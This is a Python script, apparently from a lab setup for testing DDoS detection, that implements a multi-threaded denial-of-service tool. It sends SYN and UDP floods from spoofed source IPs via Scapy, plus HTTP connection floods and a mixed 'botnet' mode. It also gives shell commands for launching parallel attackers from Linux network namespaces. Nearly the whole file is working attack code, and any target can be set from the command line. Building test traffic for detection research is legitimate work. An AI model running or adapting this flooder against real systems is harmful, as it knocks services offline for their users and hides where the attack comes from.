"""
vajra_attacker.py — Multi-IP DDoS Simulation Tool
===================================================
Two modes:

  1. --mode spoof  (Windows/Linux, no extra VMs)
     Uses Scapy raw sockets with randomised/spoofed source IPs.
     Sends SYN / UDP / HTTP floods from hundreds of fake IPs.
     Requires: run as Administrator (Windows) or root (Linux).

  2. --mode namespace  (Linux only)
     Launches attack from the current network namespace.
     Run one process per namespace (see setup instructions below).

Usage examples:
    # Spoof mode — mixed attack from 50 random IPs for 30 seconds
    python vajra_attacker.py --mode spoof --target 192.168.68.20 --duration 30 --num-ips 50

    # Namespace mode — used inside each attacker namespace
    python vajra_attacker.py --mode namespace --target 192.168.68.20 --attack syn --duration 30

    # Normal baseline traffic (no attack)
    python vajra_attacker.py --mode normal --target 192.168.68.20 --duration 10

Linux namespace quick-setup (run once, as root):
    sudo ip link add br0 type bridge
    sudo ip addr add 10.0.1.1/24 dev br0
    sudo ip link set br0 up
    for i in $(seq 1 20); do
        sudo ip netns add ns$i
        sudo ip link add veth-h$i type veth peer name veth-ns$i
        sudo ip link set veth-h$i master br0
        sudo ip link set veth-h$i up
        sudo ip link set veth-ns$i netns ns$i
        sudo ip -n ns$i addr add 10.0.0.$i/24 dev veth-ns$i
        sudo ip -n ns$i link set veth-ns$i up
        sudo ip -n ns$i route add default via 10.0.1.1
    done
    # Then launch each attacker:
    for i in $(seq 1 20); do
        sudo ip netns exec ns$i python3 vajra_attacker.py \\
            --mode namespace --target 10.0.1.1 --attack mixed --duration 60 &
    done
"""

import argparse
import random
import socket
import threading
import time

import requests
from scapy.all import IP, TCP, UDP, Raw, send, conf

# Suppress Scapy output
conf.verb = 0

TARGET_IP   = "192.168.68.20"
HTTP_PORT   = 8000
STOP_FLAG   = threading.Event()

# ──────────────────────────────────────────────
#  IP POOL HELPERS
# ──────────────────────────────────────────────

# RFC-1918 private ranges — safe to spoof in a lab
SPOOF_RANGES = [
    ("10.0.0.{}",   range(2, 254)),     # 10.0.0.2 – 10.0.0.253
    ("10.1.{}.{}",  range(1, 20)),      # 10.1.x.y
    ("172.16.{}.{}",range(1, 30)),
    ("192.168.{}.{}",range(1, 50)),
]

def random_private_ip():
    """Return a random private-range IP string."""
    template, outer = random.choice(SPOOF_RANGES)
    if "{}" in template and template.count("{}") == 2:
        return template.format(random.choice(outer), random.randint(1, 254))
    return template.format(random.randint(1, 254))


def build_ip_pool(n: int) -> list[str]:
    """Generate n unique spoofed IPs."""
    pool = set()
    while len(pool) < n:
        pool.add(random_private_ip())
    return list(pool)

# ──────────────────────────────────────────────
#  INDIVIDUAL ATTACK PRIMITIVES
# ──────────────────────────────────────────────

def send_syn(target_ip: str, src_ip: str, dport: int = 80):
    pkt = IP(src=src_ip, dst=target_ip) / TCP(dport=dport, flags="S",
                                               sport=random.randint(1024, 65535),
                                               seq=random.randint(0, 2**32-1))
    send(pkt, verbose=0)


def send_udp(target_ip: str, src_ip: str):
    pkt = IP(src=src_ip, dst=target_ip) / UDP(
        sport=random.randint(1024, 65535),
        dport=random.randint(1024, 65535)
    ) / Raw(load=b"X" * random.randint(64, 512))
    send(pkt, verbose=0)


def send_http(target_ip: str, port: int = 8000):
    """Real TCP connection — source IP is always the attacker's real IP."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((target_ip, port))
        req = (
            b"GET / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Connection: keep-alive\r\n"
            b"User-Agent: Mozilla/5.0\r\n\r\n"
        )
        s.send(req)
        s.close()
    except Exception:
        pass

# ──────────────────────────────────────────────
#  ATTACK WORKER THREADS
# ──────────────────────────────────────────────

def syn_flood_worker(target_ip: str, ip_pool: list[str], rate: float = 0.01):
    """Continuously send SYN packets cycling through ip_pool."""
    print(f"[SYN WORKER] started  — {len(ip_pool)} source IPs")
    idx = 0
    while not STOP_FLAG.is_set():
        src = ip_pool[idx % len(ip_pool)]
        send_syn(target_ip, src, dport=random.choice([80, 443, 8000, 8080]))
        idx += 1
        time.sleep(rate)


def udp_flood_worker(target_ip: str, ip_pool: list[str], rate: float = 0.01):
    print(f"[UDP WORKER] started  — {len(ip_pool)} source IPs")
    idx = 0
    while not STOP_FLAG.is_set():
        src = ip_pool[idx % len(ip_pool)]
        send_udp(target_ip, src)
        idx += 1
        time.sleep(rate)


def http_flood_worker(target_ip: str, port: int, burst: int = 10, rate: float = 0.0):
    print(f"[HTTP WORKER] started — real-IP HTTP bursts of {burst}")
    while not STOP_FLAG.is_set():
        for _ in range(burst):
            send_http(target_ip, port)
        time.sleep(rate)


def mixed_flood_worker(target_ip: str, ip_pool: list[str]):
    """Randomly cycles through SYN / UDP / HTTP — mimics a diverse botnet."""
    print(f"[MIXED WORKER] started — {len(ip_pool)} source IPs")
    idx = 0
    while not STOP_FLAG.is_set():
        src   = ip_pool[idx % len(ip_pool)]
        choice = idx % 3
        if choice == 0:
            send_syn(target_ip, src)
        elif choice == 1:
            send_udp(target_ip, src)
        else:
            send_http(target_ip, HTTP_PORT)
        idx += 1
        time.sleep(0.02)

# ──────────────────────────────────────────────
#  NORMAL TRAFFIC
# ──────────────────────────────────────────────

def normal_traffic(target_ip: str, port: int, duration: int):
    print(f"\n[NORMAL] Sending baseline traffic for {duration}s …\n")
    end = time.time() + duration
    while time.time() < end:
        try:
            requests.get(f"http://{target_ip}:{port}", timeout=2)
            print("  HTTP GET (normal)")
        except Exception:
            pass
        time.sleep(1)
    print("[NORMAL] Done\n")

# ──────────────────────────────────────────────
#  MODE: SPOOF  (multi-IP via Scapy)
# ──────────────────────────────────────────────

def mode_spoof(args):
    """
    Spawn N worker threads, each cycling through the spoofed IP pool.
    Attack type can be: syn | udp | http | mixed
    """
    ip_pool = build_ip_pool(args.num_ips)
    print(f"\n[SPOOF MODE] Target: {args.target}  IPs: {args.num_ips}  "
          f"Attack: {args.attack}  Duration: {args.duration}s")
    print(f"[SPOOF MODE] Sample IPs: {ip_pool[:5]} …\n")

    workers = []
    atk = args.attack.lower()

    for _ in range(args.threads):
        if atk == "syn":
            t = threading.Thread(target=syn_flood_worker,  args=(args.target, ip_pool), daemon=True)
        elif atk == "udp":
            t = threading.Thread(target=udp_flood_worker,  args=(args.target, ip_pool), daemon=True)
        elif atk == "http":
            t = threading.Thread(target=http_flood_worker, args=(args.target, HTTP_PORT, 10), daemon=True)
        else:  # mixed
            t = threading.Thread(target=mixed_flood_worker, args=(args.target, ip_pool), daemon=True)
        workers.append(t)
        t.start()

    print(f"[SPOOF MODE] {len(workers)} threads running …  (Ctrl+C to stop early)")
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        pass

    STOP_FLAG.set()
    print("\n[SPOOF MODE] Attack finished. Waiting for threads …")
    for t in workers:
        t.join(timeout=2)
    print("[SPOOF MODE] Done\n")

# ──────────────────────────────────────────────
#  MODE: NAMESPACE  (single-IP, inside a netns)
# ──────────────────────────────────────────────

def get_own_ip() -> str:
    """Get this namespace's own real IP by connecting a UDP socket (no packet sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))   # destination doesn't matter — just resolves routing
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def mode_namespace(args):
    """
    Runs inside a Linux network namespace.
    Each namespace has its own real virtual NIC and IP (e.g. 10.0.0.1 .. 10.0.0.20).
    Uses the namespace's REAL IP as source — no spoofing needed.
    All attack types (SYN, UDP, HTTP) correctly show the namespace IP.

    Launch with:
        sudo ip netns exec ns1 python3 vajra_attacker.py --mode namespace --target 192.168.68.20
    """
    own_ip = get_own_ip()
    atk    = args.attack.lower()

    print(f"\n[NAMESPACE MODE] My IP: {own_ip}  Attack: {atk}  Target: {args.target}  Duration: {args.duration}s\n")

    # Use own real IP as the single-item pool for raw packets
    # HTTP flood uses real socket so it automatically uses the namespace IP
    ip_pool = [own_ip]

    STOP_FLAG.clear()
    workers = []

    if atk == "syn":
        workers.append(threading.Thread(target=syn_flood_worker, args=(args.target, ip_pool, 0.05), daemon=True))
    elif atk == "udp":
        workers.append(threading.Thread(target=udp_flood_worker, args=(args.target, ip_pool, 0.05), daemon=True))
    elif atk == "http":
        workers.append(threading.Thread(target=http_flood_worker, args=(args.target, HTTP_PORT, 5, 0.1), daemon=True))
    else:  # mixed — all 3 attack types from the namespace's real IP
        workers.append(threading.Thread(target=syn_flood_worker,  args=(args.target, ip_pool, 0.05), daemon=True))
        workers.append(threading.Thread(target=udp_flood_worker,  args=(args.target, ip_pool, 0.05), daemon=True))
        workers.append(threading.Thread(target=http_flood_worker, args=(args.target, HTTP_PORT, 5, 0.2), daemon=True))

    for t in workers:
        t.start()
    print(f"[NAMESPACE MODE] {len(workers)} workers running from {own_ip}")

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        pass

    STOP_FLAG.set()
    for t in workers:
        t.join(timeout=2)
    print(f"[NAMESPACE MODE] {own_ip} done\n")

# ──────────────────────────────────────────────
#  MODE: CONTINUOUS SIMULATION (original loop)
# ──────────────────────────────────────────────

def mode_continuous(args):
    """
    Loops: normal → HTTP flood → SYN flood → UDP flood → repeat
    Uses spoofed IPs for raw-packet attacks.
    """
    ip_pool = build_ip_pool(50)
    print(f"\n[CONTINUOUS MODE] Target={args.target}  Press Ctrl+C to stop\n")

    while True:
        # Normal
        normal_traffic(args.target, HTTP_PORT, 10)
        time.sleep(random.randint(5, 10))

        # HTTP flood (real IPs — Layer 7)
        print("\n[SIM] HTTP FLOOD phase …\n")
        STOP_FLAG.clear()
        t = threading.Thread(target=http_flood_worker, args=(args.target, HTTP_PORT, 20), daemon=True)
        t.start(); time.sleep(10); STOP_FLAG.set(); t.join(2)
        time.sleep(random.randint(5, 10))

        # SYN flood (spoofed IPs)
        print("\n[SIM] SYN FLOOD phase …\n")
        STOP_FLAG.clear()
        t = threading.Thread(target=syn_flood_worker, args=(args.target, ip_pool), daemon=True)
        t.start(); time.sleep(10); STOP_FLAG.set(); t.join(2)
        time.sleep(random.randint(5, 10))

        # UDP flood (spoofed IPs)
        print("\n[SIM] UDP FLOOD phase …\n")
        STOP_FLAG.clear()
        t = threading.Thread(target=udp_flood_worker, args=(args.target, ip_pool), daemon=True)
        t.start(); time.sleep(10); STOP_FLAG.set(); t.join(2)
        time.sleep(random.randint(5, 10))

# ──────────────────────────────────────────────
#  ENTRY POINT
# ──────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Vajra DDoS Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--mode",     choices=["spoof", "namespace", "normal", "continuous"],
                        default="continuous",
                        help="spoof=multi-IP raw, namespace=inside netns, normal=baseline, continuous=original loop")
    parser.add_argument("--target",   default=TARGET_IP,    help="Target IP")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration (seconds)")
    parser.add_argument("--num-ips",  type=int, default=50, help="Number of spoofed IPs (spoof mode)")
    parser.add_argument("--threads",  type=int, default=4,  help="Worker threads (spoof mode)")
    parser.add_argument("--attack",   default="mixed",
                        choices=["syn", "udp", "http", "mixed"],
                        help="Attack type")

    args = parser.parse_args()
    HTTP_PORT = 8000   # default HTTP target port

    try:
        if args.mode == "spoof":
            mode_spoof(args)
        elif args.mode == "namespace":
            mode_namespace(args)
        elif args.mode == "normal":
            normal_traffic(args.target, HTTP_PORT, args.duration)
        else:
            mode_continuous(args)
    except KeyboardInterrupt:
        STOP_FLAG.set()
        print("\n[ATTACKER] Stopped by user")
